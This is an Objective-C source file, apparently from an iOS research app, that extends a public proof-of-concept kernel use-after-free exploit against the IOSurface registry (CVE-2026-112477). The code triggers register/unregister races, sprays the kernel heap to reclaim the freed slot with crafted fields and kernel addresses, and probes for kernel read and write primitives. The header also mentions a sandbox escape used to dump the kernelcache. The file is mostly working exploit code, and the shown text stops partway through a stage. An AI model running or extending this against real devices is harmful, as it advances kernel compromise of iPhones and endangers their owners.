// ---------------------------------------------------------------------------
// CVE-2026-112477 - IOSurfaceRootUserClient registry UAF (kernel, selectors
// 0x11 "register surface" / 0x12 "unregister surface").
//
// Public research PoC: github.com/Rust505/CVE-2026-112477 (MIT), tested by its
// author on iOS 26.4 (23E246), arm64e.  This module ports the trigger harness
// VERBATIM in behaviour and fixes/extends it with the measurements the PoC
// leaves open, because the PoC's own notes say the next step is a kernel READ
// primitive via dup structureOutput - and we found the reason it never worked:
//
//   IOKitLib.h (iOS 26.2 SDK, verified):
//     IOConnectCallAsyncMethod(conn, sel, wake_port, uint64_t *reference,
//         uint32_t referenceCnt, const uint64_t *input, uint32_t inputCnt,
//         const void *inputStruct, size_t inputStructCnt, uint64_t *output,
//         uint32_t *outputCnt, void *outputStruct, size_t *outputStructCnt)
//   The PoC's reg/dereg/groom calls are ABI-correct (the 24-byte fake object
//   IS structureInput).  But its E6/E7 "dup out-dump" stages pass the output
//   buffer as the SCALAR output with a uint32_t length where the kernel writes
//   a size_t: an 8-byte kernel write into a 4-byte stack variable.  The
//   resulting kIOReturnBadArgument (0xE00002C2) was read as "the kernel
//   validates the output shape first" - it was a userspace ABI bug.  Stage G
//   re-runs the whole out-shape matrix with correct types: that is the kernel
//   READ primitive that was never actually attempted.
//
// Also added (our measurements, not in the PoC):
//   F  selector map - a sync zero-input sweep 0..48 plus async confirmation on
//      17/18/1000 (our earlier "IOSurfaceRoot answers 0xE00002C2 for every
//      selector" was a SYNC call against an ASYNC-only selector)
//   G  dup out-shape matrix on the stale entry (kernel READ hunt) with a live
//      entry baseline, marker/echo detection and pointer-word flagging
//   H  input-qword mapping: which input qword is the registry id
//   K  deref canary: a kernel-range address in each of the 3 groom qwords,
//      fired LAST, flush-before-fire - a panic is then the signal that says
//      which slot the kernel dereferences
//   KCE kernelcache evidence: the proven bad_query sandbox escape gives READ on
//      /System - dump the kernelcache header so the IOSurface externalMethod
//      table can be disassembled offline (the exact field-layout map the PoC
//      could not get dynamically)
//
// Device under test: iPhone13,1 / iOS 26.2 beta 1 (arm64e).  Fix landed in
// 27.2 per the PoC, so this build is expected to be vulnerable - but every
// claim here is MEASURED on the device, never assumed.
// ---------------------------------------------------------------------------
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <IOKit/IOTypes.h>
#import <CoreFoundation/CoreFoundation.h>
#import <CoreVideo/CoreVideo.h>
#import <Metal/Metal.h>
#import <xpc/xpc.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <pthread.h>
#import <unistd.h>
#import <stdlib.h>
#import <stdio.h>
#import <string.h>
#import <fcntl.h>
#import <errno.h>
#import <dirent.h>
#import <sys/stat.h>

#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

#define SEL_REG     17
#define SEL_DEREG   18
#define SEL_GROOM   1000
#define GROOM_N     512

// IOSurface: not importable from the plain iOS SDK; declare the symbols.
typedef struct __IOSurface *IOSurfaceRef_;
extern IOSurfaceRef_ IOSurfaceCreate(CFDictionaryRef dictionary);
extern uint32_t IOSurfaceGetID(IOSurfaceRef_ buffer);
extern void IOSurfaceSetValue(IOSurfaceRef_, CFStringRef, CFTypeRef);

#define L(...)  AvePost(S(__VA_ARGS__))
// L2 = same, but let the network mirror actually flush (a panic later in the
// run must not swallow the last words - the phone reboots, g_log dies with it)
#define L2(...) do { AvePost(S(__VA_ARGS__)); usleep(180000); } while (0)

static const char *rcName(uint32_t v) {
    switch (v) {
        case 0:          return "SUCCESS";
        case 0xE00002C0: return "NoDevice";
        case 0xE00002C1: return "NotPrivileged";
        case 0xE00002C2: return "BadArgument";
        case 0xE00002C7: return "Unsupported";
        case 0xE00002C8: return "VMError";
        case 0xE00002C9: return "InternalError";
        case 0xE00002D8: return "NotReady";
        case 0xE00002E2: return "NotPermitted";
        default:         return "?";
    }
}

// ---------------------------------------------------------------------------
// crash forensics: every line also lands in a FILE inside the app container,
// because a kernel panic destroys g_log and the POSTs may not have flushed.
// The next launch reads the tail and reports "last module = X, killed at Y".
// ---------------------------------------------------------------------------
static FILE *g_ev = NULL;
static const char *g_evpath = NULL;

static void evOpen(void) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                          NSUserDomainMask, YES) firstObject];
    NSString *p = [docs stringByAppendingPathComponent:@"rs112477.log"];
    // strdup: the NSString is autoreleased on a queue thread, the FILE and the
    // path are used across the whole module run
    if (g_evpath) { free((void *)g_evpath); g_evpath = NULL; }
    g_evpath = strdup(p.UTF8String ? p.UTF8String : "");
    g_ev = fopen(g_evpath, "a");
    if (g_ev) setvbuf(g_ev, NULL, _IOLBF, 0);
}
static void evLine(const char *s) {
    if (g_ev) { fprintf(g_ev, "%s\n", s); }
}
#define EV(...) do { char _b[512]; snprintf(_b, sizeof _b, __VA_ARGS__); \
                    AvePost([NSString stringWithUTF8String:_b]);       \
                    evLine(_b); usleep(60000); } while (0)

// ---------------------------------------------------------------------------
// IOSurface (private API, same contract as the PoC)
// ---------------------------------------------------------------------------
static IOSurfaceRef_ mkSurface(void) {
    int w = 64, h = 4, bpe = 4, pf = 0x42475241;
    CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef P = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    const void *vk[4] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                          CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vv[4] = { W, H, B, P };
    CFDictionaryRef d = CFDictionaryCreate(NULL, vk, vv, 4,
                                           &kCFTypeDictionaryKeyCallBacks,
                                           &kCFTypeDictionaryValueCallBacks);
    IOSurfaceRef_ s = IOSurfaceCreate(d);
    CFRelease(d); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(P);
    return s;
}

static io_service_t gSvc = 0;

static int findService(void) {
    const char *cand[] = { "IOSurfaceRoot", "IOCoreSurfaceRoot", "IOSurface", NULL };
    for (int i = 0; cand[i]; i++) {
        CFMutableDictionaryRef m = IOServiceMatching(cand[i]);
        if (!m) continue;
        io_iterator_t it = 0;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it)
            continue;
        io_object_t o, first = 0;
        while ((o = IOIteratorNext(it))) { if (!first) first = o; else IOObjectRelease(o); }
        IOObjectRelease(it);
        if (first) {
            gSvc = first;
            EV("[uaf] service '%s' -> %#x", cand[i], (unsigned)first);
            return 0;
        }
    }
    EV("[uaf] ABORT: no IOSurface service");
    return -1;
}

// ---------------------------------------------------------------------------
// call plumbing - the ABI from the iOS 26.2 SDK header, verified:
//   shape 0 = SYNC control; shapes 1/2/3 = ASYNC with the reference values.
// ---------------------------------------------------------------------------
static mach_port_t newWakePort(void) {
    mach_port_t p = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS)
        return MACH_PORT_NULL;
    return p;
}
static void dropPort(mach_port_t p) {
    if (p) mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
}

static kern_return_t callSel(io_connect_t c, uint32_t sel, const uint64_t *in3,
                             size_t inSz, int shape, mach_port_t wp) {
    uint64_t buf[3] = {0,0,0};
    if (in3) { buf[0]=in3[0]; buf[1]=in3[1]; buf[2]=in3[2]; }
    uint64_t ref = 0x1122334455667788ull, zero = 0;
    uint32_t soc = 0;
    switch (shape) {
        case 0: return IOConnectCallMethod(c, sel, NULL, 0, buf, inSz, NULL, NULL, NULL, NULL);
        case 1: return IOConnectCallAsyncMethod(c, sel, wp, &ref, 1, NULL, 0,
                                                buf, inSz, NULL, NULL, NULL, NULL);
        case 2: return IOConnectCallAsyncMethod(c, sel, wp, &zero, 1, NULL, 0,
                                                buf, inSz, NULL, NULL, NULL, NULL);
        case 3: return IOConnectCallAsyncMethod(c, sel, wp, NULL, 0, NULL, 0,
                                                buf, inSz, NULL, NULL, NULL, NULL);
    }
    return KERN_FAILURE;
}

// the full-shape calls used by the out-dump stages (struct/scalar output):
static kern_return_t callAsyncFull(io_connect_t c, uint32_t sel, mach_port_t wp,
                                   const uint64_t *in3, size_t inSz,
                                   void *structOut, size_t *structOutSz,
                                   uint64_t *scalarOut, uint32_t *scalarOutCnt) {
    uint64_t buf[3] = {0,0,0};
    if (in3) { buf[0]=in3[0]; buf[1]=in3[1]; buf[2]=in3[2]; }
    uint64_t ref = 0x1122334455667788ull;
    return IOConnectCallAsyncMethod(c, sel, wp, &ref, 1, NULL, 0,
                                    buf, inSz, scalarOut, scalarOutCnt,
                                    structOut, structOutSz);
}

static kern_return_t callSyncFull(io_connect_t c, uint32_t sel, const uint64_t *in3,
                                  size_t inSz, void *structOut, size_t *structOutSz,
                                  uint64_t *scalarOut, uint32_t *scalarOutCnt) {
    uint64_t buf[3] = {0,0,0};
    if (in3) { buf[0]=in3[0]; buf[1]=in3[1]; buf[2]=in3[2]; }
    return IOConnectCallMethod(c, sel, NULL, 0, buf, inSz,
                               scalarOut, scalarOutCnt, structOut, structOutSz);
}

// dump any non-CC byte range of an out buffer (0xCC = our "untouched" fill)
static int dumpOut(const char *tag, const uint8_t *b, size_t n) {
    int hits = 0;
    size_t start = 0; int inRun = 0;
    for (size_t i = 0; i <= n; i++) {
        int clean = (i == n) || (b[i] == 0xCC);
        if (!clean && !inRun) { start = i; inRun = 1; }
        if (clean && inRun) {
            size_t len = i - start;
            EV("%s out[%#zx..%#zx) len=%zu:", tag, start, i, len);
            char line[256]; size_t off = 0;
            for (size_t j = start; j < i && off + 24 < sizeof line; j += 8) {
                uint64_t w = 0;
                if (j + 8 <= i) { memcpy(&w, b + j, 8); }
                else { for (size_t k = j; k < i; k++) w |= ((uint64_t)b[k]) << (8 * (k - j)); }
                off += (size_t)snprintf(line + off, sizeof line - off,
                                        " [%#zx]=%#016llx", j, (unsigned long long)w);
                if (off > 200) { EV("%s   %s", tag, line); off = 0; line[0] = 0; }
            }
            if (off) EV("%s   %s", tag, line);
            hits++;
            inRun = 0;
        }
    }
    return hits;
}

// ---------------------------------------------------------------------------
// Stage A - calibration: which call shape does sel17 accept?
// ---------------------------------------------------------------------------
static int calibrate(void) {
    uint64_t in[3] = {1,2,3};
    int best = -1;
    for (int shape = 0; shape < 4; shape++) {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) {
            dropPort(wp); EV("[uaf][A] calib open fail"); return -1;
        }
        kern_return_t r = callSel(c, SEL_REG, in, 24, shape, wp);
        EV("[uaf][A] calib sel17 shape=%d -> 0x%x %s", shape, (uint32_t)r, rcName((uint32_t)r));
        if (r == KERN_SUCCESS && best < 0) best = shape;
        IOServiceClose(c); dropPort(wp);
    }
    {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) == KERN_SUCCESS) {
            uint32_t r = (uint32_t)callSel(c, SEL_DEREG, in, 24, 0, wp);
            EV("[uaf][A] calib sel18 sync -> 0x%x %s", r, rcName(r));
            IOServiceClose(c);
        }
        dropPort(wp);
    }
    EV("[uaf][A] best shape=%d", best);
    return best;
}

// ---------------------------------------------------------------------------
// Stage B - the registry state machine, 17->18->17 x120
// ---------------------------------------------------------------------------
static int stageB(int shape) {
    int ok = 0;
    for (int i = 0; i < 120; i++) {
        @autoreleasepool {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { dropPort(wp); continue; }
        uint64_t in[3] = {1,2,3};
        kern_return_t r1 = callSel(c, SEL_REG,   in, 24, shape, wp);
        kern_return_t r2 = callSel(c, SEL_REG,   in, 24, shape, wp);   // dup
        kern_return_t r3 = callSel(c, SEL_DEREG, in, 24, 0,     wp);
        kern_return_t r4 = callSel(c, SEL_REG,   in, 24, shape, wp);   // re-reg
        if (r1==0 && r2==(kern_return_t)0xE00002C9 && r3==0 && r4==0) ok++;
        else if (i < 3) EV("[uaf][B] i=%d 17=0x%x dup=0x%x 18=0x%x re17=0x%x",
                           i, (uint32_t)r1,(uint32_t)r2,(uint32_t)r3,(uint32_t)r4);
        IOServiceClose(c); dropPort(wp);
        }
    }
    EV("[uaf][B] 17->18->17 full-success %d/120%s", ok,
       ok==120 ? " - userspace controls insert/remove of the registry" : "");
    return ok;
}

// ---------------------------------------------------------------------------
// Stage F - selector map.  Our earlier "IOSurfaceRoot answers 0xE00002C2 for
// every selector" was a SYNC call on an ASYNC-only selector: sweep sync with a
// zeroed input AND confirm the async shapes for 17/18/1000.
// ---------------------------------------------------------------------------
static void stageF(int shape) {
    EV("[uaf][F] === stage F: selector map (sync zero-input sweep + async confirm) ===");
    io_connect_t c = 0; mach_port_t wp = newWakePort();
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { EV("[uaf][F] open fail"); dropPort(wp); return; }
    int accepted = 0;
    for (uint32_t sel = 0; sel <= 48; sel++) {
        @autoreleasepool {
        kern_return_t r = IOConnectCallMethod(c, sel, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
        L(@"[uaf][F] sync sel %-3u -> 0x%x %s", sel, (uint32_t)r, rcName((uint32_t)r));
        if (r == KERN_SUCCESS) accepted++;
        }
    }
    EV("[uaf][F] sync-zero-input accepted %d/49", accepted);
    // async contract confirmation per selector
    uint64_t in[3] = {1,2,3};
    for (int si = 0; si < 3; si++) {
        uint32_t sel = si == 0 ? SEL_REG : si == 1 ? SEL_DEREG : SEL_GROOM;
        for (int sh = 0; sh < 4; sh++) {
            @autoreleasepool {
            kern_return_t r = callSel(c, sel, in, 24, sh, wp);
            L(@"[uaf][F] sel %u shape %d -> 0x%x %s", sel, sh, (uint32_t)r, rcName((uint32_t)r));
            }
        }
    }
    IOServiceClose(c); dropPort(wp);
}

// ---------------------------------------------------------------------------
// groom machinery - the PoC's kernel-side spray: an async call whose input
// struct (24..96 B) the kernel allocates and holds alive until the wakeport
// dies, so the freed registry slot is reclaimed by our bytes.
// ---------------------------------------------------------------------------
static io_connect_t gGroomConn = 0;
static mach_port_t gGroomWp[GROOM_N];
static int gGroomN = 0;

static void freeGroom(void) {
    for (int i = 0; i < gGroomN; i++) dropPort(gGroomWp[i]);
    gGroomN = 0;
}

static void groomRawFields(const uint64_t *fields, int nq, int inSz) {
    freeGroom();
    if (inSz <= 0 || inSz > 4096) inSz = 24;
    if (!gGroomConn && IOServiceOpen(gSvc, mach_task_self(), 0, &gGroomConn) != KERN_SUCCESS) {
        gGroomConn = 0; EV("[uaf] groom open fail"); return;
    }
    uint8_t fbuf[4096]; memset(fbuf, 0, sizeof(fbuf));
    for (int i = 0; i < nq && i * 8 + 8 <= (int)sizeof(fbuf); i++)
        memcpy(fbuf + i * 8, &fields[i], 8);
    uint64_t ref = 0xA1B2C3D4E5F60708ull;
    uint32_t soc = 0;
    for (int i = 0; i < GROOM_N; i++) {
        mach_port_t wp = newWakePort();
        if (!wp) break;
        kern_return_t r = IOConnectCallAsyncMethod(gGroomConn, SEL_GROOM, wp, &ref, 1,
                                                   NULL, 0, fbuf, (size_t)inSz,
                                                   NULL, NULL, NULL, NULL);
        if (r != KERN_SUCCESS && r != (kern_return_t)0xE00002C2) { dropPort(wp); continue; }
        gGroomWp[gGroomN++] = wp;
    }
}

// a fresh stale state: reg -> dereg (entry freed, stale pointer reachable),
// then the groom takes the slot, then the caller measures the dup/dereg.
static void staleSetup(io_connect_t c, int shape, mach_port_t wp,
                       const uint64_t *fields, int nq, int inSz) {
    uint64_t in[3] = {1,2,3};
    callSel(c, SEL_REG,   in, 24, shape, wp);
    callSel(c, SEL_DEREG, in, 24, 0,     wp);
    groomRawFields(fields, nq, inSz);
}

#define MARKER_ID   0xAABBCCDDEEFF0011ull
#define MARKER_PTR  0x1234567890ABCDEFull
#define MARKER_VAL  0x5555555555555555ull
#define CANARY_F5   0x43414E415259ull      // 'CANARY'

// ---------------------------------------------------------------------------
// primitive counters for the verdict (and the auto-escalation gates)
// ---------------------------------------------------------------------------
static int g_read_out = 0, g_read_echo = 0, g_ptr_words = 0, g_stale_seen = 0;

static int isPointerWord(uint64_t w) {
    // canonical kernel addresses on iOS arm64e live in the 0xfffffe.. / 0xfffffff.. ranges
    return (w >= 0xfffffe0000000000ull && w <= 0xfffffeffffffffffull) ||
           (w >= 0xfffffff000000000ull && w <= 0xffffffffffffffffull);
}

static int scanOut(const char *tag, const uint8_t *b, size_t n) {
    int echoes = 0;
    for (size_t i = 0; i + 8 <= n; i += 8) {
        uint64_t w; memcpy(&w, b + i, 8);
        if (w == 0xCCCCCCCCCCCCCCCCull) continue;
        if (w == MARKER_ID || w == MARKER_PTR || w == MARKER_VAL ||
            w == CANARY_F5 || w == 0x4141414141414141ull) echoes++;
        if (isPointerWord(w)) {
            EV("[uaf][G] %s PTR-WORD at +%#zx: %#016llx", tag, i, (unsigned long long)w);
            g_ptr_words++;
        }
    }
    return echoes;
}

// forward declarations (the harness stages live in probe order in this file) --
static void stageE2(int shape);
static void stageE4(int shape);
static void stageE5(int shape);
static void stageE6(int shape);
static void stageE7(int shape);
static void stageG(int shape);
static void stageH(int shape);
static void stageK(int shape);
static void stageKCE(void);
static void v_race8(int shape, int iter);
static void v_big(int shape, int iter);
static void v_surfch(int shape, int iter);
static void v_dereg18(int shape, int iter);
static void *renderLoop(void *arg);
static volatile int gRenderRun;

// ---------------------------------------------------------------------------
// Stage E3 - false-positive controls (K1: stale without groom must stay dead)
// ---------------------------------------------------------------------------
static void stageE3(int shape) {
    EV("[uaf][E3] === stage E3: controls (false-positive check) ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { EV("[uaf][E3] open fail"); return; }
    uint64_t in[3] = {1,2,3};
    int k1c9 = 0;
    for (int i = 0; i < 10; i++) {
        @autoreleasepool {
        mach_port_t wp = newWakePort();
        callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        kern_return_t r = callSel(c, SEL_REG, in, 24, shape, wp);   // dup, no groom
        if (r == (kern_return_t)0xE00002C9) k1c9++;
        dropPort(wp); usleep(2000);
        }
    }
    EV("[uaf][E3] K1 no-groom stale dup==0xC9: %d/10", k1c9);
    int k2diff = 0;
    for (int i = 0; i < 10; i++) {
        @autoreleasepool {
        mach_port_t wp = newWakePort();
        callSel(c, SEL_REG, in, 24, shape, wp);
        kern_return_t baseDup = callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        uint64_t f[6] = {0x21, MARKER_ID, MARKER_PTR, MARKER_VAL,
                         0x4141414141414141ull, CANARY_F5};
        groomRawFields(f, 6, 24);
        kern_return_t r = callSel(c, SEL_REG, in, 24, shape, wp);
        if (baseDup == (kern_return_t)0xE00002C9 && r != (kern_return_t)0xE00002C9) k2diff++;
        freeGroom(); dropPort(wp); usleep(2000);
        }
    }
    EV("[uaf][E3] K2 groom+dup repeat diff: %d/10 (should match E2 if deterministic)", k2diff);
    IOServiceClose(c);
}

// ---------------------------------------------------------------------------
// Stage E2 - stale-read oracle: dup/dereg after groom, input-size sweep
// ---------------------------------------------------------------------------
static void tryKernelWriteV2(io_connect_t c, int shape, int inSz, uint64_t addr, uint64_t val) {
    uint64_t in[3] = {1,2,3};
    mach_port_t wp = newWakePort();
    callSel(c, SEL_REG, in, 24, shape, wp);
    kern_return_t baseDup = callSel(c, SEL_REG, in, 24, shape, wp);
    callSel(c, SEL_DEREG, in, 24, 0, wp);
    staleSetup(c, shape, wp, (uint64_t[]){0x21, MARKER_ID, addr, val,
                                          0x4141414141414141ull, CANARY_F5}, 6, inSz);
    kern_return_t rdup  = callSel(c, SEL_REG,   in, 24, shape, wp);
    kern_return_t rdreg = callSel(c, SEL_DEREG, in, 24, 0,     wp);
    int hit = (baseDup == (kern_return_t)0xE00002C9) && (rdup != (kern_return_t)0xE00002C9);
    if (hit) g_stale_seen++;
    EV("[uaf][E2] sz=%d baseDup=0x%x dup=0x%x(%s) dereg=0x%x hit=%s",
       inSz, (uint32_t)baseDup, (uint32_t)rdup, rcName((uint32_t)rdup),
       (uint32_t)rdreg, hit ? "STALE-READ" : "no");
    freeGroom(); dropPort(wp);
}

static void stageE2(int shape) {
    EV("[uaf][E2] === stage E2: stale-read probe (dup/dereg oracle, size sweep) ===");
    uint64_t target = 0xfffffff007000000ull;
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { EV("[uaf][E2] open fail"); return; }
    int probeSizes[] = {24, 48, 64, 96};
    int tries = 0, hits = 0;
    for (int s = 0; s < 4; s++) {
        for (int i = 0; i < 10; i++) {
            @autoreleasepool {
            tryKernelWriteV2(c, shape, probeSizes[s], target, CANARY_F5);
            tries++; usleep(2000);
            }
        }
    }
    EV("[uaf][E2] done tries=%d", tries);
    IOServiceClose(c);
}

// ---------------------------------------------------------------------------
// Stage E4 - field mapping: does the kernel read a refcnt-like field?
// ---------------------------------------------------------------------------
static void groomF0(uint64_t f0, uint64_t addr, uint64_t val, int inSz) {
    uint64_t f[6] = {f0, MARKER_ID, addr, val, 0x4141414141414141ull, CANARY_F5};
    groomRawFields(f, 6, inSz);
}

static void stageE4(int shape) {
    EV("[uaf][E4] === stage E4: field mapping (f0 refcnt sweep + dereg effect) ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { EV("[uaf][E4] open fail"); return; }
    uint64_t in[3] = {1,2,3};
    uint64_t f0vals[3] = {0, 1, 0x21};
    for (int v = 0; v < 3; v++) {
        int hits = 0; uint32_t lastDup = 0, lastDreg = 0;
        for (int i = 0; i < 5; i++) {
            @autoreleasepool {
            mach_port_t wp = newWakePort();
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            groomF0(f0vals[v], 0xfffffff007000000ull, CANARY_F5, 24);
            kern_return_t rdup  = callSel(c, SEL_REG,   in, 24, shape, wp);
            kern_return_t rdreg = callSel(c, SEL_DEREG, in, 24, 0,     wp);
            if (rdup != (kern_return_t)0xE00002C9) hits++;
            lastDup = (uint32_t)rdup; lastDreg = (uint32_t)rdreg;
            freeGroom(); dropPort(wp); usleep(2000);
            }
        }
        EV("[uaf][E4] f0=0x%llx hits=%d/5 dup=0x%x dereg=0x%x",
           (unsigned long long)f0vals[v], hits, lastDup, lastDreg);
        g_stale_seen += hits;
    }
    {
        @autoreleasepool {
        mach_port_t wp = newWakePort();
        callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        groomF0(1, 0xfffffff007000000ull, CANARY_F5, 24);
        EV("[uaf][E4] X2 triple-dup: d1=0x%x d2=0x%x d3=0x%x",
           (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp),
           (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp),
           (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp));
        freeGroom(); dropPort(wp);
        }
    }
    IOServiceClose(c);
}

// ---------------------------------------------------------------------------
// Stage E5 - content dependence: does the kernel READ our fields?
// ---------------------------------------------------------------------------
static void stageE5(int shape) {
    EV("[uaf][E5] === stage E5: content-dependence (id check on the groom?) ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { EV("[uaf][E5] open fail"); return; }
    uint64_t in[3] = {1,2,3};
    uint64_t fa[6] = {0x21, 0x1122334455667788ull, 0, 0, 0x4141414141414141ull, CANARY_F5}; // no id==1
    uint64_t fb[6] = {0x21, 1, 0, 0, 0x4141414141414141ull, CANARY_F5};                      // id echo
    uint64_t fc[6] = {0x21, 0xdead, 0, 0, 0x4141414141414141ull, CANARY_F5};                 // non-1 id
    const char *names[3] = {"A_no-id1", "B_f1=1", "C_f1=dead"};
    uint64_t *cases[3] = {fa, fb, fc};
    for (int t = 0; t < 3; t++) {
        int hits = 0; uint32_t lastDup = 0;
        for (int i = 0; i < 5; i++) {
            @autoreleasepool {
            mach_port_t wp = newWakePort();
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            groomRawFields(cases[t], 6, 24);
            kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
            if (rdup != (kern_return_t)0xE00002C9) hits++;
            lastDup = (uint32_t)rdup;
            freeGroom(); dropPort(wp); usleep(2000);
            }
        }
        EV("[uaf][E5] %s hits=%d/5 dup=0x%x", names[t], hits, lastDup);
        g_stale_seen += hits;
    }
    IOServiceClose(c);
}

// ---------------------------------------------------------------------------
// Stage E6 - id sweep with a REAL surface id + slot shift
// ---------------------------------------------------------------------------
static void stageE6(int shape) {
    EV("[uaf][E6] === stage E6: real-id sweep + slot shift ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { EV("[uaf][E6] open fail"); return; }
    uint64_t in[3] = {1,2,3};
    IOSurfaceRef_ s = mkSurface();
    uint32_t sid = (s && &IOSurfaceGetID) ? IOSurfaceGetID(s) : 0;
    EV("[uaf][E6] real surface id=0x%x", sid);
    if (sid) {
        for (int d = 1; d <= 4; d++) {
            @autoreleasepool {
            mach_port_t wp = newWakePort();
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            uint64_t f[6] = {0x21, (uint64_t)(sid + d), 0, 0, 0x4141414141414141ull, CANARY_F5};
            groomRawFields(f, 6, 24);
            kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
            EV("[uaf][E6] id+%-2d dup=0x%x", d, (uint32_t)rdup);
            freeGroom(); dropPort(wp); usleep(2000);
            }
        }
        CFRelease(s);
    }
    for (int slot = 0; slot < 3; slot++) {
        int hits = 0; uint32_t lastDup = 0;
        for (int i = 0; i < 5; i++) {
            @autoreleasepool {
            mach_port_t wp = newWakePort();
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            uint64_t f[6] = {0x4141414141414141ull, 0x4141414141414141ull, 0x4141414141414141ull, 0, 0, CANARY_F5};
            f[slot] = 0x21;
            groomRawFields(f, 6, 24);
            kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
            if (rdup != (kern_return_t)0xE00002C9) hits++;
            lastDup = (uint32_t)rdup;
            freeGroom(); dropPort(wp); usleep(2000);
            }
        }
        EV("[uaf][E6] slot%d=0x21 hits=%d/5 dup=0x%x", slot, hits, lastDup);
        g_stale_seen += hits;
    }
    IOServiceClose(c);
}

// ---------------------------------------------------------------------------
// Stage E7 - with the ABI FIXED this time (size_t outputStructCnt, not the
// PoC's uint32_t): the kernel READ hunt that never actually happened there.
// sync dup-out dump on the stale entry vs a live entry, then size sweep,
// then the refcnt-decrement sequence, then the zero/content control.
// ---------------------------------------------------------------------------
static void stageE7(int shape) {
    EV("[uaf][E7] === stage E7: CORRECT out-shape dup-out + sweep + refcnt-dec ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { EV("[uaf][E7] open fail"); return; }
    uint64_t in[3] = {1,2,3};

    // --- (1) stale-hit dup-out vs live dup-out, sync and async ---
    for (int mode = 0; mode < 2; mode++) {
        @autoreleasepool {
        mach_port_t wp = newWakePort();
        callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        uint64_t f[6] = {0x21, MARKER_ID, MARKER_PTR, MARKER_VAL,
                         0x4141414141414141ull, CANARY_F5};
        groomRawFields(f, 6, 24);
        uint8_t out[256]; memset(out, 0xCC, sizeof(out));
        size_t olen = sizeof(out);
        uint64_t sc[8]; uint32_t scn = 0;
        kern_return_t r;
        if (mode == 0) r = callSyncFull(c, SEL_REG, in, 24, out, &olen, sc, &scn);
        else            r = callAsyncFull(c, SEL_REG, wp, in, 24, out, &olen, sc, &scn);
        EV("[uaf][E7] %s dup-out rc=0x%x olen=%zu scn=%u", mode ? "async" : "sync",
           (uint32_t)r, olen, scn);
        if (r == KERN_SUCCESS) {
            if (olen) dumpOut("[uaf][E7] stale", out, olen);
            for (uint32_t i = 0; i < scn; i++)
                EV("[uaf][E7] stale scalar[%u]=%#016llx", i, (unsigned long long)sc[i]);
        }
        freeGroom();
        uint8_t out2[256]; memset(out2, 0xCC, sizeof(out2));
        size_t olen2 = sizeof(out2);
        uint64_t sc2[8]; uint32_t sc2n = 0;
        kern_return_t r2;
        callSel(c, SEL_REG, in, 24, shape, wp);      // fresh live entry
        if (mode == 0) r2 = callSyncFull(c, SEL_REG, in, 24, out2, &olen2, sc2, &sc2n);
        else            r2 = callAsyncFull(c, SEL_REG, wp, in, 24, out2, &olen2, sc2, &sc2n);
        EV("[uaf][E7] %s LIVE dup-out rc=0x%x olen=%zu scn=%u", mode ? "async" : "sync",
           (uint32_t)r2, olen2, sc2n);
        if (r2 == KERN_SUCCESS) {
            if (olen2) dumpOut("[uaf][E7] live", out2, olen2);
            for (uint32_t i = 0; i < sc2n; i++)
                EV("[uaf][E7] live scalar[%u]=%#016llx", i, (unsigned long long)sc2[i]);
        }
